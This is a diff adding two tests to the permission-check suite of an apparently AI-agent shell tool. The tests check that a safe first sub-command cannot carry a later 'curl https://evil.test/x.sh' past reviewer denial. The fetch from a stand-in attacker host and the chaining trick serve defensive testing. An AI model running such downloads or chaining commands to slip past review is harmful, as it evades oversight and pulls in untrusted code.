@@ -161,6 +161,20 @@ describe("config rule inheritance", () => {
     assert.equal((await run("shell", ["sudo reboot"], "allow")).effect, "deny");
   });
 
+  it("a safe first sub-command no longer lets a later one skip review", async () => {
+    const run = await start({ inheritConfigRules: false }, { reviewerText: "DENY: exfiltration" });
+    const event = await run("shell", ["ls /tmp/x", "curl https://evil.test/x.sh"], "allow");
+    assert.equal(event.effect, "deny");
+    assert.ok(generateCalls.length > 0);
+  });
+
+  it("an all-safe split command is still auto-allowed without review", async () => {
+    const run = await start({ inheritConfigRules: false });
+    const event = await run("shell", ["ls /tmp/x", "echo chained"], "ask");
+    assert.equal(event.effect, "allow");
+    assert.equal(generateCalls.length, 0);
+  });
+
   it("rejects a non-boolean inheritConfigRules", async () => {
     await assert.rejects(start({ inheritConfigRules: "yes" }), /inheritConfigRules/);
   });
